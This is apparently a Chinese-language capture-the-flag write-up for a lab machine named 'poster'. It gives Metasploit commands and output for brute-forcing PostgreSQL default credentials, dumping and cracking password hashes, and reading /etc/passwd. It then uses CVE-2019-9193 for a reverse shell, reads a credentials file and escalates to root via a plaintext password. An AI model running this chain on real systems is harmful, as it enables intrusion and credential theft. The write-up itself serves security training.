## poster






**掃描**
```
rustscan -a 10.10.80.235 -- -sV



22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack Apache httpd 2.4.18 ((Ubuntu))
5432/tcp open  postgresql syn-ack PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.21
```



**搜尋模塊暴力破解**
```
search type:auxiliary postgres
auxiliary/scanner/postgres/postgres_login

use  auxiliary/scanner/postgres/postgres_login
set rhosts 10.10.80.235


[+] 10.10.80.235:5432 - Login Successful: postgres:password@template1

用户名是 'postgres'，密码是 'password'，连接到 'template1' 数据库。

```



**搜尋模塊執行SQL**
```
auxiliary/admin/postgres/postgres_sql


set rhosts 10.10.80.235
set username postgres
set password password


//可以更換其他語句
set SQL SELECT version()
set SQL SELECT current_user
set SQL SELECT current_database()
set SQL SELECT current_schema()
```

**回傳版本**
```
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
```


---

**搜尋模塊執行hash_dump**






**dump Postgres 伺服器上的使用者。**
```
auxiliary/scanner/postgres/postgres_hashdump 


set rhosts 10.10.80.235
set username postgres
set password password
```


**結果**
```
 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc



線上破解出 4個
 darkstart  8842b99375db43e9fdf238753623a27d	qwertydarkstart
 poster     78fb805c7412ae597b399844a54cce0a	batmanposter
 postgres   32e12f215ba27cb750c9e093ce4b5127	passwordpostgres
 sistemas   f7dbc0d5a06653e74da6b1af9290ee2b
 ti         7af9ac4c593e9e4f275576e13f935579	abcd1234ti
 tryhackme  03aab1165001c8f8ccae31a8824efddc
```




---


**讀取檔案**
```
auxiliary/admin/postgres/postgres_readfile

set rhosts 10.10.80.235
set username postgres
set password password


```

**結果**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
```


---


PostgreSQL 9.5.21


CVE-2019-9193 細節
```
https://www.exploit-db.com/exploits/50847
```


search type:exploit postgres



在 PostgreSQL 9.3 到 11.2 中
从9.3版本开始，Postgres新增了一个 COPY TO/FROM PROGRAM功能，允许数据库的超级用户以及 

pg_read_server_files组中的任何用户执行操作系统命令
pg_execute_server_program」中的使用者執行群組在資料庫作業系統使用者的上下文中執行任意程式碼。此功能預設為啟用



這是一組 PostgreSQL 中的角色（roles）或權限的描述，這些角色具有不同的權限和能力。以下是排版後的描述：

1. **pg_read_all_settings：**
   - 读取所有配置变量，包括那些通常只对超级用户可见的变量。

2. **pg_read_all_stats：**
   - 读取所有的 `pg_stat_*` 视图并且使用与扩展相关的各种统计信息，包括那些通常只对超级用户可见的信息。

3. **pg_stat_scan_tables：**
   - 执行可能会在表上取得 `ACCESS SHARE` 锁的监控函数，可能会持锁很长时间。

4. **pg_monitor：**
   - 读取/执行各种不同的监控视图和函数。该角色是 `pg_read_all_settings`、`pg_read_all_stats` 和 `pg_stat_scan_tables` 的成员。

5. **pg_signal_backend：**
   - 发送信号到其他后端以取消查询或中止其会话。

6. **pg_read_server_files：**
   - 允许使用 `COPY` 以及其他文件访问函数从服务器上该数据库可访问的任意位置读取文件。

7. **pg_write_server_files：**
   - 允许使用 `COPY` 以及其他文件访问函数在服务器上该数据库可访问的任意位置中写入文件。

8. **pg_execute_server_program：**
   - 允许使用运行该数据库的用户执行数据库服务器上的程序，以便与 `COPY` 和其他允许执行服务器端程序的函数配合使用。



pg_read_server_files、pg_write_server_files以及pg_execute_server_program角色的目的是允许管理员有一些可信但不是超级用户的角色来访问文件以及以运行数据库的用户在数据库服务器上运行程序。 由于这些角色能够访问服务器文件系统上的任何文件，因此在直接访问文件时它们会绕过任何数据库级别的权限检查并且它们可以被用来得到超级用户级别的访问，因此在把这些角色授予给用户时应当特别小心。



我能讀取代表我 有 pg_read_server_files



```
exploit/multi/postgres/postgres_copy_from_program_cmd_exec

set rhosts 10.10.80.235
set username postgres
set password password
set lhost 10.18.1.192


```


**拿到shell不過權限很小 postgres**

**預設是sh 可以換bash **



**能看到 兩個用戶**
dark cat
alison 權限比較大

```
cat /home/dark/credentials.txt
```

找到 帳戶密碼
```
dark:qwerty1234#!hackme
```

-------------------------------------------------------------------------------
**登入**
```
ssh dark@10.10.80.235 
```

**預設是sh 可以換bash **


**找到**
```
dark@ubuntu:/var/www/html$ cat config.php 
```

```
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>
```


**登入**
```
su alison
p4ssw0rdS3cur3!#
```



**拿flag**
```
sudo ls -al /root

sudo cat /root/root.txt
```